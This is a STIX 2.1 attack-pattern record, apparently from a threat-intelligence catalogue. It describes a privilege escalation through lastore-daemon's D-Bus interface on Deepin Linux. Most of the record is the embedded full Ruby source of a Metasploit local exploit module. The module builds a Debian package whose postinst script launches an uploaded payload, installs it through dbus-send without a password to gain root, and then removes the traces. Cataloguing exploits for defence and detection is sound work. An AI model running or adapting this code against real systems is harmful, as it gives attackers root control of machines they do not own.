{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--55904038-3724-4dfb-97ab-4d640748bcc7",
    "created": "2024-08-14T16:59:01.998828Z",
    "modified": "2024-08-14T16:59:01.998833Z",
    "name": "lastore-daemon D-Bus Privilege Escalation",
    "description": " This module attempts to gain root privileges on Deepin Linux systems by using lastore-daemon to install a package.  The lastore-daemon D-Bus configuration on Deepin Linux permits any user in the sudo group to install arbitrary system packages without providing a password, resulting in code execution as root. By default the first user created on the system is a member of the sudo group.  This module has been tested successfully with lastore-daemon versions 0.9.53-1 on Deepin Linux 15.5 (x64); and 0.9.66-1 on Deepin Linux 15.7 (x64).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/lastore_daemon_dbus_priv_esc.rb",
            "external_id": "lastore_daemon_dbus_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/bcoles/02aa274ce32dc350e34b6d4d1ad0e0e8"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'lastore-daemon D-Bus Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Deepin Linux systems\n        by using lastore-daemon to install a package.\n\n        The lastore-daemon D-Bus configuration on Deepin Linux permits any\n        user in the sudo group to install arbitrary system packages without\n        providing a password, resulting in code execution as root. By default,\n        the first user created on the system is a member of the sudo group.\n\n        This module has been tested successfully with lastore-daemon versions\n        0.9.53-1 on Deepin Linux 15.5 (x64); and\n        0.9.66-1 on Deepin Linux 15.7 (x64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          \"King's Way\",   # Discovery and exploit\n          'bcoles' # Metasploit\n        ],\n      'DisclosureDate' => '2016-02-02',\n      'References'     =>\n        [\n          [ 'EDB', '39433' ],\n          [ 'URL', 'https://gist.github.com/bcoles/02aa274ce32dc350e34b6d4d1ad0e0e8' ],\n        ],\n      'Platform'       => 'linux',\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'DefaultTarget'  => 0))\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def mkdir(path)\n    vprint_status \"Creating '#{path}' directory\"\n    cmd_exec \"mkdir -p #{path}\"\n    register_dir_for_cleanup path\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    cmd_exec \"chmod +x '#{path}'\"\n  end\n\n  def command_exists?(cmd)\n    cmd_exec(\"command -v #{cmd} && echo true\").include? 'true'\n  end\n\n  def dbus_priv?\n    res = install_package '', ''\n    (res.include? 'DBus.Error.AccessDenied') ? false : true\n  end\n\n  def install_package(name, path)\n    dbus_send dest: 'com.deepin.lastore',\n              type: 'method_call',\n              path: '/com/deepin/lastore',\n              interface: 'com.deepin.lastore.Manager.InstallPackage',\n              contents: \"string:'#{name}' string:'#{path}'\"\n  end\n\n  def remove_package(name)\n    dbus_send dest: 'com.deepin.lastore',\n              type: 'method_call',\n              path: '/com/deepin/lastore',\n              interface: 'com.deepin.lastore.Manager.RemovePackage',\n              contents: \"string:' ' string:'#{name}'\"\n  end\n\n  def dbus_send(dest:, type:, path:, interface:, contents:)\n    cmd_exec \"dbus-send --system --print-reply --dest=#{dest} --type=#{type} #{path} #{interface} #{contents}\"\n  end\n\n  def check\n    %w(lastore-daemon dpkg-deb dbus-send).each do |cmd|\n      unless command_exists? cmd\n        vprint_error \"#{cmd} is not installed. Exploitation will fail.\"\n        return CheckCode::Safe\n      end\n      vprint_good \"#{cmd} is installed\"\n    end\n\n    unless dbus_priv?\n      vprint_error 'User is not permitted to install packages. Exploitation will fail.'\n      return CheckCode::Safe\n    end\n    vprint_good 'User is permitted to install packages'\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    print_status 'Building package...'\n\n    payload_name = \".#{rand_text_alphanumeric rand(10..15)}\"\n    payload_path = \"#{base_dir}/#{payload_name}\"\n    pkg_name = rand_text_alphanumeric rand(10..15)\n    pkg_path = \"#{base_dir}/.#{pkg_name}\"\n\n    mkdir \"#{pkg_path}/DEBIAN\"\n    pkg = \"Package: #{pkg_name}\\n\"\n    pkg << \"Version: 0.1\\n\"\n    pkg << \"Maintainer: #{pkg_name}\\n\"\n    pkg << \"Architecture: all\\n\"\n    pkg << \"Description: #{pkg_name}\\n\"\n    upload \"#{pkg_path}/DEBIAN/control\", pkg\n    upload_and_chmodx \"#{pkg_path}/DEBIAN/postinst\", \"#!/bin/sh\\n#{payload_path} &\"\n\n    cmd_exec \"dpkg-deb --build '#{pkg_path}'\"\n\n    unless file_exist? \"#{pkg_path}.deb\"\n      fail_with Failure::Unknown, 'Building package failed'\n    end\n\n    print_status 'Uploading payload...'\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    print_status 'Installing package...'\n    res = install_package pkg_name, \"#{pkg_path}.deb\"\n    vprint_line res\n\n    unless res.include? 'object path'\n      fail_with Failure::Unknown, 'Package installation failed. Check /var/log/lastore/daemon.log'\n    end\n\n    Rex.sleep 15\n\n    print_status 'Removing package...'\n    res = remove_package pkg_name.downcase\n    vprint_line res\n\n    unless res.include? 'object path'\n      print_warning 'Package removal failed. Check /var/log/lastore/daemon.log'\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-02-02",
    "x_mitre_platforms": [
        "linux'"
    ]
}